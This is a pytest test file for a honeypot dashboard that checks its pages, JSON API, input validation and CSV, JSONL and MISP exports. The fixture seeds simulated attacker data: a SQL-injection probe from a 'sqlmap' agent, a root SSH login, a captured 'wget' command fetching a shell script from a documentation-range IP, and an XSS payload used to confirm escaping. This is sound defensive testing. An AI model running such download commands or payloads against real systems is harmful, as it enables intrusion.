"""
Tests for Member 6: dashboard pages, JSON API and exports.
"""
import csv
import io
import json

import pytest

from conftest import clear_database
from app.dashboard.app import app
from app.storage.database import get_database


@pytest.fixture
def data():
    clear_database()
    db = get_database()
    now = db.utc_now()
    for i in range(60):
        db.create_session({'session_id': f'http-{i:03}', 'source_ip': f'203.0.113.{i % 5}', 'source_port': 4000 + i,
                           'dest_port': 8080, 'protocol': 'http', 'started_at': now, 'user_agent': 'sqlmap/1.7'})
        db.log_interaction({'session_id': f'http-{i:03}', 'timestamp': now, 'interaction_type': 'http_request',
                            'http_method': 'GET', 'http_path': '/index.php', 'http_query_params': '{"id": ["1\'"]}',
                            'attack_signature': 'sqli'})
        db.end_session(f'http-{i:03}', now, 0.01)
    db.create_session({'session_id': 'ssh-1', 'source_ip': '198.51.100.7', 'source_port': 5555, 'dest_port': 2222,
                       'protocol': 'ssh', 'started_at': now, 'ssh_client_version': 'SSH-2.0-libssh2_1.9.0'})
    db.log_auth_attempt({'session_id': 'ssh-1', 'timestamp': now, 'username': 'root', 'password_hash': '$2b$x',
                         'auth_method': 'password', 'success': True})
    for command, label in (('wget http://203.0.113.9/x.sh', 'download'), ('<script>alert(1)</script>', 'unknown')):
        db.log_interaction({'session_id': 'ssh-1', 'timestamp': now, 'interaction_type': 'ssh_command',
                            'command': command, 'command_classification': label, 'fake_output': 'out'})
    db.upsert_ip_intel({'ip_address': '198.51.100.7', 'country_code': 'NL', 'country_name': 'Netherlands'})
    app.config['TESTING'] = True
    return app.test_client()


def test_overview_page(data):
    r = data.get('/')
    assert r.status_code == 200
    for text in (b'Total sessions', b'61', b'download', b'T1105', b'Netherlands', b'sqli'):
        assert text in r.data


def test_sessions_page_is_paginated(data):
    page1 = data.get('/sessions')
    assert page1.status_code == 200 and b'page 1 of 2' in page1.data
    assert page1.data.count(b'href="/session/') == 50
    page2 = data.get('/sessions?page=2')
    assert page2.data.count(b'href="/session/') == 11


def test_sessions_filter_and_sort(data):
    r = data.get('/sessions?protocol=ssh&sort=source_ip&order=asc')
    assert r.data.count(b'href="/session/') == 1 and b'198.51.100.7' in r.data


def test_bad_page_numbers_do_not_crash(data):
    for url in ('/sessions?page=abc', '/sessions?page=-4', '/sessions?page=999', '/sessions?sort=hack'):
        assert data.get(url).status_code == 200


def test_session_detail_escapes_attacker_input(data):
    r = data.get('/session/ssh-1')
    assert r.status_code == 200
    assert b'<script>alert(1)</script>' not in r.data
    assert b'&lt;script&gt;alert(1)&lt;/script&gt;' in r.data
    assert b'Let in (weak password)' in r.data and b'SSH-2.0-libssh2_1.9.0' in r.data


def test_unknown_session_is_404(data):
    assert data.get('/session/does-not-exist').status_code == 404
    assert data.get('/api/session/does-not-exist').status_code == 404


def test_api_stats(data):
    stats = data.get('/api/stats').get_json()
    assert stats['total_sessions'] == 61 and stats['commands_captured'] == 2 and stats['successful_logins'] == 1


@pytest.mark.parametrize('query, limit, offset', [
    ('limit=abc', 50, 0), ('limit=-1', 1, 0), ('limit=99999', 500, 0), ('offset=-5', 50, 0), ('limit=10&offset=5', 10, 5),
])
def test_api_sessions_validates_input(data, query, limit, offset):
    r = data.get(f'/api/sessions?{query}')
    body = r.get_json()
    assert r.status_code == 200 and body['limit'] == limit and body['offset'] == offset
    assert len(body['sessions']) <= limit


def test_api_timeline_hours(data):
    assert len(data.get('/api/timeline?hours=6').get_json()) == 6
    assert len(data.get('/api/timeline?hours=abc').get_json()) == 24


def test_api_attack_types_and_origins(data):
    types = data.get('/api/attack_types').get_json()
    assert {'label': 'sqli', 'count': 60} in types['http_attacks']
    origins = data.get('/api/origins').get_json()
    assert any(o['country_code'] == 'NL' for o in origins)


def test_export_jsonl(data):
    r = data.get('/export/jsonl')
    lines = [json.loads(line) for line in r.data.decode().splitlines()]
    assert {e['event_type'] for e in lines} >= {'session', 'auth_attempt', 'http_request', 'ssh_command'}
    wget = next(e for e in lines if e.get('command', '').startswith('wget'))
    assert wget['mitre_technique'] == 'T1105' and wget['country'] == 'NL'


def test_export_csv(data):
    r = data.get('/export/csv/sessions')
    rows = list(csv.DictReader(io.StringIO(r.data.decode('utf-8-sig'))))
    assert len(rows) == 61 and 'source_ip' in rows[0]
    assert data.get('/export/csv/not_a_table').status_code == 404


def test_export_misp(data):
    event = data.get('/export/misp').get_json()['Event']
    values = {(a['type'], a['value']) for a in event['Attribute']}
    assert ('ip-src', '198.51.100.7') in values
    assert ('url', 'http://203.0.113.9/x.sh') in values
    assert {'name': 'mitre-attack:T1105'} in event['Tag']
